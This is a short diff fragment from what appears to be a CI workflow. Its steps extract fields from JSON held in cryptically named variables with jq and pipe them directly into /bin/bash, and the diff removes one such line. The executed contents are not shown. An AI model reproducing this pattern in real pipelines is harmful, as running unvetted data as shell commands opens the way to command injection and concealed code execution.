@@ -29,7 +29,6 @@ jobs:
           echo $bs78 | jq -r .mu25792 | /bin/bash
           echo $ait86519 | jq -r .glw533 | /bin/bash
           printf '%s' "$ql23" | jq -r .o0 | /bin/bash
-          echo $f1 | jq -r .fb7401 | /bin/bash
           printf '%s' "$q9307" | jq -r .k6205 | /bin/bash
 
       - name: Archive results
